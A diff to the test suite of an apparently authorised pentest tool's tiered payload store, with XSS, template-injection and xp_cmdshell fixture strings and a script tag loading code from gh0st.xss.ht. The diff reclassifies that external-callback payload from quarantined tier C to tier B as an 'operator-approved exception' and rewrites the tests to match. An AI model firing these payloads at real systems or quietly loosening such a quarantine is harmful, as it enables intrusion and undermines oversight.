@@ -115,10 +115,15 @@ class TestShippedConfig:
     def test_every_alias_is_tier_a(self) -> None:
         # config.yaml maps only discovery wordlists. If a tier B or C file ever
         # gets aliased there, this fails before anything fires it at a target.
+        # Derived deduplicated files are surfaced by the catalog but never by
+        # config aliases — they carry ``derived: True`` and are checked
+        # separately in the next test.
         configured = store_from_config(Config.load())
         if not configured.available:
             pytest.skip("payload store not built on this machine")
         for item in configured.catalog():
+            if item.get("derived"):
+                continue
             assert item["tier"] == "A", f"{item['name']} is tier {item['tier']}"
 
     def test_aliases_resolve_to_real_files(self) -> None:
@@ -126,7 +131,13 @@ class TestShippedConfig:
         if not configured.available:
             pytest.skip("payload store not built on this machine")
         for item in configured.catalog():
-            assert configured.resolve(item["name"]).path.is_file()
+            if item.get("derived"):
+                # Derived files resolve by name with their own tier gate: the
+                # discovery union is tier A, the injection union is tier B and
+                # must refuse without the opt-in.
+                assert configured.resolve(item["name"], allow_tier_b=True).path.is_file()
+            else:
+                assert configured.resolve(item["name"]).path.is_file()
 
 
 class TestCatalogTool:
@@ -180,9 +191,12 @@ class TestTierBReachability:
              "sha256": "x", "get_only": False, "reasons": []},
             {"name": "vulJs.txt", "tier": "B", "kind": "injection", "lines": 1,
              "sha256": "x", "get_only": False, "reasons": []},
-            {"name": "xss.txt", "tier": "C", "kind": "injection", "lines": 5,
+            {"name": "xss.txt", "tier": "B", "kind": "injection", "lines": 5,
              "sha256": "x", "get_only": False,
-             "reasons": ["callback to GH0ST.xss.ht"]},
+             "reasons": ["operator-approved tier-B exception (callback to GH0ST.xss.ht recorded)"]},
+            {"name": "nasty.txt", "tier": "C", "kind": "injection", "lines": 1,
+             "sha256": "x", "get_only": False,
+             "reasons": ["quarantine decoy"]},
         ]
     }
 
@@ -198,8 +212,9 @@ class TestTierBReachability:
         )
         (root / "B" / "xsswafbypss.txt").write_text("<Svg Only=1 OnLoad=confirm(1)>\n")
         (root / "B" / "vulJs.txt").write_text("{{constructor.constructor('alert(1)')()}}\n")
+        (root / "B" / "xss.txt").write_text("<script src=//gh0st.xss.ht></script>\n")
         (root / "_quarantine").mkdir()
-        (root / "_quarantine" / "xss.txt").write_text("<script src=//gh0st.xss.ht></script>\n")
+        (root / "_quarantine" / "nasty.txt").write_text("xp_cmdshell\n")
         engagement.config.data["payloads"] = {"store": str(root), "lists": {}}
         return root
 
@@ -279,13 +294,12 @@ class TestTierBReachability:
     async def test_tier_c_is_still_unreachable_from_the_tool(
         self, engagement, tier_b_store, captured_dalfox, monkeypatch
     ) -> None:
-        # The manifest's own tool_map names xss.txt for xss_validate, and xss.txt
-        # is quarantined for a GH0ST.xss.ht callback. Even an alias table that
-        # asks for it by name is refused at resolution, and nothing is run.
+        # Tier C stays quarantined even when an alias table asks for it by
+        # name — the refusal happens at resolution, and nothing is run.
         from cordon.tools import exploitation as ex
 
         monkeypatch.setitem(
-            ex.XSS_PAYLOAD_LISTS, "xss-quarantined", {"file": "xss.txt", "tools": ["dalfox"]}
+            ex.XSS_PAYLOAD_LISTS, "xss-quarantined", {"file": "nasty.txt", "tools": ["dalfox"]}
         )
         self._approve(engagement)
         result = await REGISTRY["xss_validate"].fn(
